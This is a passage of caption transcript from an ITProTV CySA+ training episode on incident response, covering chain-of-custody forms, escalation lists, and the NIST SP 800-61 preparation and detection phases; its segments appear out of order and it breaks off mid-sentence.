00:08:36.053\nI mean, just simply opening up\na document changes the last access time,\n\n150\n00:08:36.053 --> 00:08:38.580\npotentially the last modified time.\n\n151\n00:08:38.580 --> 00:08:40.221\nAnd if that gets called into question,\n\n152\n00:08:40.221 --> 00:08:42.220\nyou've collected this\nevidence on this date.\n\n153\n00:08:42.220 --> 00:08:46.945\nThe last modified time is after that date,\nthat evidence is gonna easily be\n\n154\n00:08:46.945 --> 00:08:48.353\nthrown out of court.\n&gt;&gt;

Mm-hm.\n\n463\n00:23:32.132 --> 00:23:33.666\n&gt;&gt; Well, Ronnie didn't fill out\n\n464\n00:23:33.666 --> 00:23:38.110\nthe evidence, the chain of custody form,\nso see how it creates that paper trail.\n\n465\n00:23:38.110 --> 00:23:43.042\nNow Mike's on the on the hot seat cuz he's\nthe last one whose name as when receiving\n\n466\n00:23:43.042 --> 00:23:44.629\nit or as in collecting it.\n\n467\n00:23:44.629 --> 00:23:46.761\nAnd it didn't get\ntransferred to anyone else,\n\n468\n00:23:46.761 --> 00:23:49.610\nthe chain of custody\nform wasn't filled out.\n\n469\n00:23:49.610 --> 00:23:51.560\nI can't verify whether or\nnot it was or not,\n\n470\n00:23:51.560 --> 00:23:54.500\nnow we're calling into question\nthe veracity of the data.\n\n471\n00:23:54.500 --> 00:23:58.740\nSo you can find all these types of\nforms online for a download and\n\n472\n00:23:58.740 --> 00:24:00.110\nyou check them out.\n\n473\n00:24:00.110 --> 00:24:01.184\nCreate your own if you want there.\n\n474\n00:24:01.184 --> 00:24:05.910\nThat you just need some idea of here's\nwho got it, here's who's receiving it,\n\n475\n00:24:05.910 --> 00:24:10.633\nhere's when it was done, the times,\nthe dates, the item number, what it was,\n\n476\n00:24:10.633 --> 00:24:12.598\nhow many, location of the time.\n\n477\n00:24:12.598 --> 00:24:16.320\nBe as detailed as you can possibly be.\n\n478\n00:24:16.320 --> 00:24:19.104\nThat way the integrity of it\ncan be maintained, right?\n\n479\n00:24:19.104 --> 00:24:21.426\nOthers are incident response plans.\n\n480\n00:24:21.426 --> 00:24:24.791\nCreate an incident response\nplan that's part of your kit,\n\n481\n00:24:24.791 --> 00:24:29.140\nto be honest with you, or\nyou create an incident response playbook.\n\n482\n00:24:29.140 --> 00:24:30.740\nWe're gonna talk more about\nthat in another show.\n\n483\n00:24:32.410 --> 00:24:35.007\nBut if you don't have a plan,\nyou won't know what to do.\n\n484\n00:24:35.007 --> 00:24:39.098\nYou've just got an incident and now you're\ngonna have to rely on bringing in outside\n\n485\n00:24:39.098 --> 00:24:41.590\nhelp instead of maybe being\nable to do it yourself.\n\n486\n00:24:42.770 --> 00:24:46.950\nIf at the very least,\nmake your incident response plan, call XYZ\n\n487\n00:24:46.950 --> 00:24:51.660\ncompany who does forensics investigation\n[LAUGH] so that they can come and do this.\n\n488\n00:24:51.660 --> 00:24:52.640\nThat's the plan.\n\n489\n00:24:52.640 --> 00:24:54.240\nOkay, well now we know that.\n\n490\n00:24:54.240 --> 00:24:56.580\nNow it's documented, we put it in there.\n\n491\n00:24:56.580 --> 00:24:59.540\nThe incident form, what happened?\n\n492\n00:24:59.540 --> 00:25:01.770\nJust a detailed form of what occurred.\n\n493\n00:25:01.770 --> 00:25:05.165\nAgain, you can download these things\nin a myriad of different places, so\n\n494\n00:25:05.165 --> 00:25:06.300\ngo download one.\n\n495\n00:25:06.300 --> 00:25:10.120\nAnd then a call list or\na slash escalation list.\n\n496\n00:25:10.120 --> 00:25:13.136\nIf something occurs, I'm walking by,\nI sit down at my desk,\n\n497\n00:25:13.136 --> 00:25:14.645\nI realize something is wrong.\n\n498\n00:25:14.645 --> 00:25:16.572\nWho do I call?\n\n499\n00:25:16.572 --> 00:25:18.200\nWho do I inform?\n\n500\n00:25:18.200 --> 00:25:21.160\nNow maybe that person is me, right?\n\n501\n00:25:21.160 --> 00:25:23.436\nBut if it's not me and\nI'm the person you're supposed to call,\n\n502\n00:25:23.436 --> 00:25:24.545\nhow do other people know that?\n\n503\n00:25:24.545 --> 00:25:28.370\nAnd if it isn't me,\nhow do I know who to call?\n\n504\n00:25:28.370 --> 00:25:30.898\nWell, you have a list and\nthrow these up on intranet sites,\n\n505\n00:25:30.898 --> 00:25:32.627\nyou put them in the employee handbooks.\n\n506\n00:25:32.627 --> 00:25:35.790\nMake it available in a common\narea to where you can go and see,\n\n507\n00:25:35.790 --> 00:25:38.343\nhere's who you call in\ncase an incident occurs.\n\n508\n00:25:38.343 --> 00:25:43.440\nAnd if that person is unable to handle it,\nwho do they escalate to?\n\n509\n00:25:43.440 --> 00:25:44.750\nSo there's the escalation list.\n\n510\n00:25:44.750 --> 00:25:48.780\nWell, this was beyond my scope,\nI'm just a first responder.\n\n511\n00:25:48.780 --> 00:25:53.558\nI'm gonna cordon off the area\nwith crime tape and call Mike.\n\n512\n00:25:53.558 --> 00:25:56.728\nMike, you come,\nyou're the digital forensic investigator,\n\n513\n00:25:56.728 --> 00:26:00.220\nI'm gonna let you do your business,\nyou're the person I go to next.\n\n514\n00:26:00.220 --> 00:26:01.460\nI've gotten the area secured for you,\n\n515\n00:26:01.460 --> 00:26:05.250\nyou should be able to get down to\ninvestigating and take care of business.\n\n516\n00:26:05.250 --> 00:26:09.019\nSo these are the different forms you gotta\nbe aware of that might be in your digital\n\n517\n00:26:09.019 --> 00:26:11.590\nforensics tool.\n&gt;&gt;

ITProTV,\n\n6\n00:00:15.093 --> 00:00:16.629\nI'm your host Mike Rodrick.\n\n7\n00:00:16.629 --> 00:00:18.510\nToday we're doing our CySA+, and\n\n8\n00:00:18.510 --> 00:00:22.540\nspecifically we're gonna be working\nwith incident response plans.\n\n9\n00:00:22.540 --> 00:00:25.350\nAnd here in studios with us is\nnone other than Mr. Daniel Lowrie.\n\n10\n00:00:25.350 --> 00:00:26.020\nWelcome, Daniel.\n\n11\n00:00:26.020 --> 00:00:29.910\n&gt;&gt; Mike, thanks for having me yet\nagain, back in the studio, more CySA+.\n\n12\n00:00:29.910 --> 00:00:31.047\nI know you good folks out there-\n&gt;&gt; Good times.\n\n13\n00:00:31.047 --> 00:00:33.790\n&gt;&gt; Yeah, it's been fun so far.\n\n14\n00:00:33.790 --> 00:00:37.820\nWe're gonna have some more fun\ntalking about incident response plans.\n\n15\n00:00:37.820 --> 00:00:40.306\nAnd hopefully you have your\nlittle red tape guns handy.\n\n16\n00:00:40.306 --> 00:00:41.873\n&gt;&gt; [LAUGH]\n&gt;&gt; Cuz we're gonna be applying it to\n\n17\n00:00:41.873 --> 00:00:42.670\nall sorts of things.\n\n18\n00:00:42.670 --> 00:00:45.388\n&gt;&gt; Woo-hoo, that's me,\nthat sounds like definitions.\n\n19\n00:00:45.388 --> 00:00:46.662\n&gt;&gt; Yeah, I know.\n\n20\n00:00:46.662 --> 00:00:47.390\n&gt;&gt; And terminology.\n\n21\n00:00:47.390 --> 00:00:53.054\n&gt;&gt; It is, it's one of those episodes where\nyou need to know some specific things and\n\n22\n00:00:53.054 --> 00:00:55.482\nwhat those things are defined as.\n\n23\n00:00:55.482 --> 00:00:59.390\nSo today it's gonna be a bit\nof definition rattle-off.\n\n24\n00:00:59.390 --> 00:01:03.330\nBut we are gonna try to take a look at\nhow we apply some of those definitions\n\n25\n00:01:03.330 --> 00:01:04.260\nin a practical way.\n\n26\n00:01:04.260 --> 00:01:07.990\nSo I always try to bring in some\nsort of practicality to these shows,\n\n27\n00:01:07.990 --> 00:01:12.150\neven when it is just a, hey,\nyou must brute-force memorize x,y, and z.\n\n28\n00:01:12.150 --> 00:01:13.128\nBut we'll work it out.\n\n29\n00:01:13.128 --> 00:01:16.789\n&gt;&gt; And methodologies, while maybe not\nthe most exciting thing in the world,\n\n30\n00:01:16.789 --> 00:01:18.194\nthey're there for reason.\n\n31\n00:01:18.194 --> 00:01:19.834\n&gt;&gt; Very important.\n&gt;&gt; I mean, we know and\n\n32\n00:01:19.834 --> 00:01:22.714\nI'm sure you're gonna\ndiscuss the importance\n\n33\n00:01:22.714 --> 00:01:26.170\nof having a plan in place\nbefore an incident ever occurs.\n\n34\n00:01:26.170 --> 00:01:27.810\nSo one of those things that we gotta know.\n\n35\n00:01:27.810 --> 00:01:32.209\n&gt;&gt; Right, cuz you think man, I know how\nto work with these forensic toolkits and\n\n36\n00:01:32.209 --> 00:01:35.044\nthese suites of utilities and\nblah, blah, blah.\n\n37\n00:01:35.044 --> 00:01:38.390\nWell, which one do you do first,\nor do you even touch those at all?\n\n38\n00:01:38.390 --> 00:01:41.670\nIt depends,\nwhat does your plan of action call for?\n\n39\n00:01:41.670 --> 00:01:46.616\nSo developing that plan is an important\nphase of your life cycle when\n\n40\n00:01:46.616 --> 00:01:52.106\nyou're become A, a CySA+, they want\nyou to be able to know how to do that.\n\n41\n00:01:52.106 --> 00:01:57.462\nAnd when you become some sort of blue\nteamer in an organization somewhere,\n\n42\n00:01:57.462 --> 00:02:00.870\nyou now know this is\nwhy this is important.\n\n43\n00:02:01.930 --> 00:02:05.360\nI can now tell Mike, Mike,\nwe've got an outbreak of virus,\n\n44\n00:02:05.360 --> 00:02:07.121\ngo grab the playbook for that.\n\n45\n00:02:07.121 --> 00:02:09.256\nAnd he can follow that incident plan and\n\n46\n00:02:09.256 --> 00:02:12.250\ntake care of that without\nany other interventions.\n\n47\n00:02:12.250 --> 00:02:15.780\n&gt;&gt; Yeah, I don't know why, but mentally I\nalways picture, you know the movie scenes\n\n48\n00:02:15.780 --> 00:02:22.090\nwhere everything around the person is\ngoing crazy, moving at 90 miles an hour?\n\n49\n00:02:22.090 --> 00:02:26.388\nAnd the person that the scene is focusing\non is just in slow motion, they're in zen.\n\n50\n00:02:26.388 --> 00:02:27.395\n&gt;&gt; Yeah.\n&gt;&gt; Right, and\n\n51\n00:02:27.395 --> 00:02:30.515\nthat's kinda where you wanna be,\nbecause when that incident occurs,\n\n52\n00:02:30.515 --> 00:02:31.921\nthere's a little bit of panic.\n\n53\n00:02:31.921 --> 00:02:34.273\nAnd people start making, or\nif they don't have a plan-\n\n54\n00:02:34.273 --> 00:02:34.850\n&gt;&gt; Rash decisions.\n\n55\n00:02:34.850 --> 00:02:37.814\n[LAUGH]\n&gt;&gt; Yeah, bad decisions get made and\n\n56\n00:02:37.814 --> 00:02:41.555\nyou're that zen coming in,\nsaying we have a plan.\n\n57\n00:02:41.555 --> 00:02:45.695\n&gt;&gt; And not only that, we're talking\nabout how the panic mode sets in, and\n\n58\n00:02:45.695 --> 00:02:50.732\nthat fight-or-flight response starts doing\nall sorts of weird stuff to your body and\n\n59\n00:02:50.732 --> 00:02:53.564\nyour mind, and\nyou might make a wrong decision.\n\n60\n00:02:53.564 --> 00:02:57.810\nBut if you grab a playbook off the shelf\nthat tells you exactly your instant\n\n61\n00:02:57.810 --> 00:03:01.385\nresponse plan, that says this\nis how we handle these things.\n\n62\n00:03:01.385 --> 00:03:04.247\nAnd you follow, well A,\nyou can turn that fight or flight off,\n\n63\n00:03:04.247 --> 00:03:07.500\ncuz you don't have to sit there and\ngo, what do I do?\n\n64\n00:03:07.500 --> 00:03:09.736\nI know exactly what to do, here it is,\nwe've already developed it.\n\n65\n00:03:09.736 --> 00:03:11.590\nAnd if we haven't, we're working on one,\n\n66\n00:03:11.590 --> 00:03:14.740\nyou should be anyway, and\nyou try to beat these things to the punch.\n\n67\n00:03:14.740 --> 00:03:18.070\nYou pull that playbook off,\nyou follow it step by step.\n\n68\n00:03:18.070 --> 00:03:21.780\nNow you can release some stress, and\n\n69\n00:03:21.780 --> 00:03:26.450\nalso whatever you do, it was in the\nplaybook, I did what the playbook said.\n\n70\n00:03:26.450 --> 00:03:29.457\nThat's the official documentation for\nwhat to do in this situation.\n\n71\n00:03:29.457 --> 00:03:34.169\nSo if something goes sideways,\nyou go, I follow the rules, right?\n\n72\n00:03:34.169 --> 00:03:34.861\n&gt;&gt; [LAUGH] Right.\n\n73\n00:03:34.861 --> 00:03:36.750\n&gt;&gt; I did what I was supposed to do.\n\n74\n00:03:36.750 --> 00:03:41.239\nMaybe we need to adjust our playbook,\ndepending on what we've discovered\n\n75\n00:03:41.239 --> 00:03:44.958\nhappened in this incident,\nmake some modifications there.\n\n76\n00:03:44.958 --> 00:03:48.679\nBut I followed what I was supposed to do,\nand you cannot find fault with me for\n\n77\n00:03:48.679 --> 00:03:51.040\ndoing that, cuz that's my job, right?\n\n78\n00:03:51.040 --> 00:03:54.960\nSo developing an incident response plan,\nthat's a very important step.\n\n79\n00:03:54.960 --> 00:03:57.810\nSo let's talk about\nthe phases of these things,\n\n80\n00:03:57.810 --> 00:04:02.620\nthe cool thing is, man NIST doesn't\nhardly ever leave us out in the weeds.\n\n81\n00:04:02.620 --> 00:04:06.640\nBack to the old 800, what is it,\nthe SP 800-61 document revision 2,\n\n82\n00:04:06.640 --> 00:04:10.030\nI believe it is at this point in time.\n\n83\n00:04:10.030 --> 00:04:15.148\nWill help guide us through this process\nand give you a nice handy reference.\n\n84\n00:04:15.148 --> 00:04:17.830\nYou can print it out, put it on your desk,\nwhatever, get a digital copy of it.\n\n85\n00:04:17.830 --> 00:04:20.587\nI just leave them on the web,\nbecause the web holds things for me,\n\n86\n00:04:20.587 --> 00:04:22.259\nI don't have to take up all my storage.\n\n87\n00:04:22.259 --> 00:04:23.567\n&gt;&gt; [LAUGH]\n&gt;&gt; [LAUGH] I mean,\n\n88\n00:04:23.567 --> 00:04:25.740\nwith PDFs, I just put in a URL.\n\n89\n00:04:25.740 --> 00:04:28.050\nBut if you go there,\nyou'll see all these definitions.\n\n90\n00:04:28.050 --> 00:04:29.970\nLet's start with preparation, right?\n\n91\n00:04:31.600 --> 00:04:34.310\nWe need to prepare for an incident, and\n\n92\n00:04:34.310 --> 00:04:36.905\nthat should be part of our\nincident response plan.\n\n93\n00:04:36.905 --> 00:04:41.598\nAnd typically the preparation, what we\nmean is, we have developed the toolkit\n\n94\n00:04:41.598 --> 00:04:45.532\nnecessary so that we can respond\nwhen an incident occurs, right?\n\n95\n00:04:45.532 --> 00:04:47.954\nSo that's what we mean\nwhen we say preparation,\n\n96\n00:04:47.954 --> 00:04:51.620\nat least the preparation phase\nof our incident response plan.\n\n97\n00:04:51.620 --> 00:04:53.070\n&gt;&gt; And\nwe talked about that in another episode.\n\n98\n00:04:53.070 --> 00:04:56.250\nWe're talking about getting the tools\nready that we might need, and\n\n99\n00:04:56.250 --> 00:04:57.850\nall of that that goes into our kit.\n\n100\n00:04:57.850 --> 00:05:00.330\n&gt;&gt; Exactly, do we have that in place?\n\n101\n00:05:00.330 --> 00:05:01.880\nIs that ready to go?\n\n102\n00:05:01.880 --> 00:05:03.879\nIf not,\nyou probably wanna get on that, and\n\n103\n00:05:03.879 --> 00:05:07.568\nof course these things don't happen in\nan instant, you develop them over time.\n\n104\n00:05:07.568 --> 00:05:11.470\nBut you should be working toward\nbeing as prepared as possible.\n\n105\n00:05:11.470 --> 00:05:15.330\nDeveloping that toolkit out as\nrobust as you possibly can.\n\n106\n00:05:15.330 --> 00:05:19.310\nBudgeting for items that might be\na little more pricey, but very,\n\n107\n00:05:19.310 --> 00:05:23.660\nvery helpful,\nin the case of the worst happening.\n\n108\n00:05:23.660 --> 00:05:27.230\nSo just prepare that toolkit out\nas well as you possibly can,\n\n109\n00:05:27.230 --> 00:05:28.984\nand that will be a lifesaver.\n\n110\n00:05:28.984 --> 00:05:31.730\nIf an incident does occur,\nyou have the tools there.\n\n111\n00:05:31.730 --> 00:05:34.961\nThink of it as being a mechanic, someone\npulls their car in, and they go hey,\n\n112\n00:05:34.961 --> 00:05:36.023\nI need to change my tire.\n\n113\n00:05:36.023 --> 00:05:38.488\nAnd you're going well,\nwe'll gonna need a lug wrench.\n\n114\n00:05:38.488 --> 00:05:41.231\n&gt;&gt; [LAUGH]\n&gt;&gt; Which I don't have.\n\n115\n00:05:41.231 --> 00:05:43.026\nWell, no problem,\nwhat about my alternator?\n\n116\n00:05:43.026 --> 00:05:47.130\nYeah, that requires a boxing\nwrench that I don't have.\n\n117\n00:05:47.130 --> 00:05:48.882\nThat's what would you be like.\n\n118\n00:05:48.882 --> 00:05:53.193\nSomeone would think you're a mechanic,\nyou don't have the tools you need?\n\n119\n00:05:53.193 --> 00:05:54.931\nYou're a forensics, or\n\n120\n00:05:54.931 --> 00:06:00.180\nyou're part of incident response as\nbeing an IT and security worker.\n\n121\n00:06:00.180 --> 00:06:03.820\nSo you should have the tools\nnecessary at your ready to handle\n\n122\n00:06:03.820 --> 00:06:05.300\nthose incidents when they occur.\n\n123\n00:06:05.300 --> 00:06:07.550\nRight, so that's preparation.\n\n124\n00:06:07.550 --> 00:06:09.790\nThen we move on to detection and\nanalysis, and\n\n125\n00:06:09.790 --> 00:06:12.560\nthis is where we can actually\njump into my computer here.\n\n126\n00:06:12.560 --> 00:06:15.020\nAnd I've got up that NIST document for us.\n\n127\n00:06:15.020 --> 00:06:18.169\nSo much fun, let me see here, let me\njust bump it one more time, there we go,\n\n128\n00:06:18.169 --> 00:06:19.763\njust because I felt like it, why not?\n\n129\n00:06:19.763 --> 00:06:20.602\n&gt;&gt; [LAUGH]\n&gt;&gt; And\n\n130\n00:06:20.602 --> 00:06:25.957\nwhat we want to work with through here is,\nwhen you get into detection analysis,\n\n131\n00:06:25.957 --> 00:06:30.447\nthere are a few different ways in\nwhich we can detect and/or analyze\n\n132\n00:06:30.447 --> 00:06:35.130\nthe different events and\nincidents that might be occurring.\n\n133\n00:06:35.130 --> 00:06:36.940\nWe can look at alerts, right?\n\n134\n00:06:36.940 --> 00:06:38.510\nAnd this is where we start here, right?\n\n135\n00:06:38.510 --> 00:06:42.010\nPrecursors and indicators are identified\nby using many different sources.\n\n136\n00:06:42.010 --> 00:06:44.790\nWith the most common being blah,\nblah, blah, alerts, logs,\n\n137\n00:06:44.790 --> 00:06:46.910\npublicly available information,\nand people.\n\n138\n00:06:46.910 --> 00:06:49.320\nThese are the things that you\nneed to know for the exam.\n\n139\n00:06:49.320 --> 00:06:54.130\nRight, so alerts, they come from\nplaces like IDPSs and SIEMs and\n\n140\n00:06:54.130 --> 00:06:59.556\nantivirus, antispam or software,\nfile integrity checking software,\n\n141\n00:06:59.556 --> 00:07:02.804\nthird party monitoring services, right?\n\n142\n00:07:02.804 --> 00:07:07.210\nAll the stuff that we kind of been talking\nabout, a lot them will generate an alert.\n\n143\n00:07:07.210 --> 00:07:09.154\nAnd you can set them up\nto send your emails,\n\n144\n00:07:09.154 --> 00:07:11.863\ntext messages,\nmaybe Snapchat you nowadays, who knows?\n\n145\n00:07:11.863 --> 00:07:12.932\n&gt;&gt; [LAUGH]\n&gt;&gt; [LAUGH] Right,\n\n146\n00:07:12.932 --> 00:07:16.068\nthey build all sorts of crazy\nfunctionality in these things anymore.\n\n147\n00:07:16.068 --> 00:07:20.877\nBut you can say, when an event occurs and\nit is of a certain type,\n\n148\n00:07:20.877 --> 00:07:26.820\ntypically security or critical,\nI need to know about that immediately.\n\n149\n00:07:26.820 --> 00:07:31.920\nSo these alerts are going to help us\nin understanding what's going on,\n\n150\n00:07:31.920 --> 00:07:36.610\nstart giving us at least some indication\nof, well, the incident is malware.\n\n151\n00:07:36.610 --> 00:07:40.290\nOkay, my antimalware system,\nmy antivirus system has been going crazy.\n\n152\n00:07:40.290 --> 00:07:42.587\nI've got a malware infection\ngoing on throughout my.\n\n153\n00:07:42.587 --> 00:07:47.442\nNow I know where that's at, what type of\nattack it is, or incident that it is,\n\n154\n00:07:47.442 --> 00:07:48.840\nand I can move on.\n\n155\n00:07:48.840 --> 00:07:50.880\nAnd you just wanna look\nthrough these descriptions.\n\n156\n00:07:50.880 --> 00:07:53.510\nI'm not gonna read definitions\nto you good folks out there.\n\n157\n00:07:53.510 --> 00:07:56.876\nYou guys can read,\nI'm not here to do that for you.\n\n158\n00:07:56.876 --> 00:08:01.072\nYou just need to know what's on the exam\nand where that information is, and\n\n159\n00:08:01.072 --> 00:08:03.482\nit's right here inside of this document.\n\n160\n00:08:03.482 --> 00:08:07.813\nWhich is in section 3.2.3.\n\n161\n00:08:07.813 --> 00:08:09.460\nSo let's move on, logs.\n\n162\n00:08:09.460 --> 00:08:11.010\nWhere can we find logs?\n\n163\n00:08:11.010 --> 00:08:13.000\nWell, operating systems, right.\n\n164\n00:08:13.000 --> 00:08:14.780\nService and application logs.\n\n165\n00:08:14.780 --> 00:08:17.290\nWe've seen that,\nwe looked at the Windows Event Viewer,\n\n166\n00:08:17.290 --> 00:08:19.880\nwe looked at syslogs inside of Linux.\n\n167\n00:08:19.880 --> 00:08:23.380\nAnd all the other different\napplication logs that we find therein.\n\n168\n00:08:23.380 --> 00:08:26.080\nPlenty of different information\nthat goes on in there.\n\n169\n00:08:26.080 --> 00:08:30.580\nNetwork device logs, we saw that\nwith Cisco, right, they create logs.\n\n170\n00:08:30.580 --> 00:08:32.180\nCheckpoint, firewalls, you name it.\n\n171\n00:08:32.180 --> 00:08:37.370\nA lot of these things are creating\nsome form of logging.\n\n172\n00:08:37.370 --> 00:08:41.120\nAnd sending it somewhere and we just need\nto be able to gather that information,\n\n173\n00:08:41.120 --> 00:08:47.042\ntake a look inside of there and look for\nthose IOCs or indicators of compromise.\n\n174\n00:08:47.042 --> 00:08:50.560\nNetwork Flows was another one, kind of cut\noff on the other side of the page there,\n\n175\n00:08:50.560 --> 00:08:52.990\nwhich went like this,\nlet's go NetFlow system,\n\n176\n00:08:52.990 --> 00:08:58.290\nthe Flukes devices that are out there,\nOpen Source NetFlows that you can find.\n\n177\n00:08:58.290 --> 00:08:58.900\nPlay with them.\n\n178\n00:08:58.900 --> 00:09:01.980\nI think Solar Winds probably has something\nbuilt in, doesn't have n NetFlow.\n\n179\n00:09:01.980 --> 00:09:03.610\nI believe it does,\nif I'm remembering correctly.\n\n180\n00:09:03.610 --> 00:09:07.990\nNagios is Open Source Solar Winds\ntype of system.\n\n181\n00:09:07.990 --> 00:09:10.830\nVery robust, so\nthis is where you'll see Netflix.\n\n182\n00:09:10.830 --> 00:09:13.580\n&gt;&gt; And this looking at unusual activity,\n\n183\n00:09:13.580 --> 00:09:17.220\nlike a much larger percentage of\noutbound traffic than we normally see.\n\n184\n00:09:17.220 --> 00:09:19.340\n&gt;&gt; Nailed it.\n&gt;&gt; Maybe somebody's exfiltrating data.\n\n185\n00:09:19.340 --> 00:09:23.900\n&gt;&gt; Exactly, hey, why is all the sudden\nMike's laptop the top talker and\n\n186\n00:09:23.900 --> 00:09:25.900\nit's eating up all the bandwidth?\n\n187\n00:09:25.900 --> 00:09:26.850\nThat's interesting to me.\n\n188\n00:09:26.850 --> 00:09:28.370\nMaybe I want to go take a look at it.\n\n189\n00:09:28.370 --> 00:09:33.630\nOr I set a threshold that says, if\nsomeone gets to x amounts, then alert me.\n\n190\n00:09:33.630 --> 00:09:36.240\nIt might even send an alert to you,\nso there you go.\n\n191\n00:09:36.240 --> 00:09:39.410\nTaking logs and alerts, putting them\ntogether and making a great day out of it.\n\n192\n00:09:39.410 --> 00:09:40.200\n&gt;&gt; All right.\n\n193\n00:09:41.250 --> 00:09:45.600\n&gt;&gt; Publicly available information, this\nis information on new vulnerabilities and\n\n194\n00:09:45.600 --> 00:09:48.600\nexploits, so just keeping up\nwith these vulnerabilities.\n\n195\n00:09:48.600 --> 00:09:53.110\nUnderstanding what new thing is out,\nthis is following your security feeds.\n\n196\n00:09:53.110 --> 00:09:55.250\nWhat's in the news,\nwhat's happening right now.\n\n197\n00:09:55.250 --> 00:09:56.810\nIt wasn't too long ago it was Struts.\n\n198\n00:09:56.810 --> 00:10:00.250\nAnd then before that it was Dirty Cow and\nbefore that it was Shell Shock and\n\n199\n00:10:00.250 --> 00:10:01.230\non and on you go.\n\n200\n00:10:01.230 --> 00:10:04.370\nIf you don't know these things\nare something you have to worry about,\n\n201\n00:10:04.370 --> 00:10:07.965\nit's hard for\nyou to identify when they're happening.\n\n202\n00:10:07.965 --> 00:10:10.585\nSo use public available\ninformation at your ready so\n\n203\n00:10:10.585 --> 00:10:15.335\nthat you as your own person,\ncan spot these things and have an idea.\n\n204\n00:10:15.335 --> 00:10:16.405\nYou know what?\nThis looks\n\n205\n00:10:16.405 --> 00:10:18.585\na lot like I was wondering\nabout that dirty cow thing.\n\n206\n00:10:18.585 --> 00:10:19.125\n&gt;&gt; Mm-hm.\n\n207\n00:10:19.125 --> 00:10:21.465\n&gt;&gt; This seems a lot like that.\n\n208\n00:10:21.465 --> 00:10:23.015\nLet me investigate further.\n\n209\n00:10:23.015 --> 00:10:24.757\nRight, but\nif you didn't know what that was,\n\n210\n00:10:24.757 --> 00:10:26.285\nyou wouldn't have been able to spot it.\n\n211\n00:10:26.285 --> 00:10:26.915\nSo there you go.\n\n212\n00:10:28.940 --> 00:10:32.700\nPeople, people from\nwithin the organization,\n\n213\n00:10:32.700 --> 00:10:35.440\npeople from outside of the organization.\n\n214\n00:10:35.440 --> 00:10:39.410\nBasically, this is the idea of,\nif you see something say something.\n\n215\n00:10:39.410 --> 00:10:42.230\nIf someone reports something weird,\ninvestigate it.\n\n216\n00:10:42.230 --> 00:10:42.840\nFollow it up.\n\n217\n00:10:42.840 --> 00:10:44.915\nDon't just go,\nyou don't know what you're talking about.\n\n218\n00:10:44.915 --> 00:10:45.800\n&gt;&gt; Mm-hm.\n\n219\n00:10:45.800 --> 00:10:47.120\n&gt;&gt; That's the basic idea here.\n\n220\n00:10:47.120 --> 00:10:50.760\nAgain, I'll let you filter through\nall the specific definitions.\n\n221\n00:10:50.760 --> 00:10:53.530\nBut the basic idea here is,\nif Mike calls and says,\n\n222\n00:10:53.530 --> 00:10:54.560\nsomething's weird with my computer.\n\n223\n00:10:54.560 --> 00:10:56.390\nIt's acting really, really slowly.\n\n224\n00:10:56.390 --> 00:10:57.390\nAnd I go.\n\n225\n00:10:57.390 --> 00:10:58.730\nLet me take a look at the network.\n\n226\n00:10:58.730 --> 00:11:00.840\nNetwork traffic looks normal.\n\n227\n00:11:00.840 --> 00:11:03.770\nLet me check Mike's computer specifically.\n\n228\n00:11:03.770 --> 00:11:07.870\nHe does have a bit of a spike in\nhis network utilization, weird.\n\n229\n00:11:07.870 --> 00:11:09.100\nLet me take a look at the process.\n\n230\n00:11:09.100 --> 00:11:10.510\nI'm gonna run it down.\n\n231\n00:11:10.510 --> 00:11:12.250\nWhy is he having this issue?\n\n232\n00:11:12.250 --> 00:11:14.750\nJust because he says it's running\nslow doesn't mean it's not actually.\n\n233\n00:11:14.750 --> 00:11:15.450\nWhat does he say,\n\n234\n00:11:15.450 --> 00:11:18.150\njust because you're paranoid doesn't\nmean people aren't following you?\n\n235\n00:11:18.150 --> 00:11:18.740\n&gt;&gt; Yeah.\n&gt;&gt; Right,\n\n236\n00:11:18.740 --> 00:11:24.360\nso if someone says something,\ntake a minute to look into it and\n\n237\n00:11:24.360 --> 00:11:27.730\njust verify that either there is\nsomething wrong or there isn't.\n\n238\n00:11:27.730 --> 00:11:32.080\n&gt;&gt; We do tend to underestimate or\nunderutilize our employees sometimes.\n\n239\n00:11:32.080 --> 00:11:35.410\nWe've got all these tools in place,\nIDS's, IPS's.\n\n240\n00:11:35.410 --> 00:11:39.830\nSystems and all that but\nif you've got 500 employees,\n\n241\n00:11:39.830 --> 00:11:43.020\nthere's 1,000 eyes on your network that\nyou should take advantage of, right?\n\n242\n00:11:43.020 --> 00:11:46.310\n&gt;&gt; Exactly right, you've got this whole\n\n243\n00:11:46.310 --> 00:11:50.690\nhive of bees out there just waiting\nto tell you something and God knows,\n\n244\n00:11:50.690 --> 00:11:54.770\nthey love to complain when things\naren't working as they expect them to.\n\n245\n00:11:54.770 --> 00:11:58.750\nSo use that use them as these network\nof spies that you have out there\n\n246\n00:11:58.750 --> 00:12:01.820\nthat they don't even know that they\nare they're like CIAs they don't even know\n\n247\n00:12:01.820 --> 00:12:03.080\nthey're working for you.\n\n248\n00:12:03.080 --> 00:12:05.930\n&gt;&gt; And it makes them feel good if they\ncan help the security team I mean who\n\n249\n00:12:05.930 --> 00:12:06.717\ndoesn't like to help.\n\n250\n00:12:06.717 --> 00:12:09.904\n&gt;&gt; Yeah, I can't tell you how\nmany times I've gotten calls,\n\n251\n00:12:09.904 --> 00:12:12.130\nhey my antivirus system is pinging.\n\n252\n00:12:12.130 --> 00:12:15.270\nIt's giving me alerts so\ndo you know about this?\n\n253\n00:12:15.270 --> 00:12:18.510\nI've got this weird air\ndid you know about this?\n\n254\n00:12:18.510 --> 00:12:20.530\nNow what are we talking about.\n\n255\n00:12:20.530 --> 00:12:23.710\nTypically if you have some\ncentralized inverse it does great.\n\n256\n00:12:23.710 --> 00:12:28.818\nBut you know what we kind of get a little,\n\n257\n00:12:28.818 --> 00:12:32.586\nwhenever like a lava alerts.\n\n258\n00:12:32.586 --> 00:12:36.018\nWe might not be as diligent as we\nshould be when it comes to this things.\n\n259\n00:12:36.018 --> 00:12:39.930\nSo it's nice when all of a sudden\nsomeone was calling you and\n\n260\n00:12:39.930 --> 00:12:42.020\nsay, hey I got an anti-virus alert.\n\n261\n00:12:42.020 --> 00:12:43.820\nDid you see that, maybe I didn't.\n\n262\n00:12:43.820 --> 00:12:44.800\nAnd it happens, right?\n\n263\n00:12:44.800 --> 00:12:46.540\nI'm busy throughout my day.\n\n264\n00:12:46.540 --> 00:12:49.840\nMake a lot of anti-virus\nalerts depending on the day.\n\n265\n00:12:49.840 --> 00:12:51.970\nSo be aware of those people.\n\n266\n00:12:51.970 --> 00:12:54.940\nThey can definitely be helpful\nto you in that endeavor.\n\n267\n00:12:56.010 --> 00:12:57.590\n&gt;&gt; All right, let's move on here.\n\n268\n00:12:57.590 --> 00:13:03.290\nCreating baselines and profiles in\nthe network, a very, very good idea.\n\n269\n00:13:03.290 --> 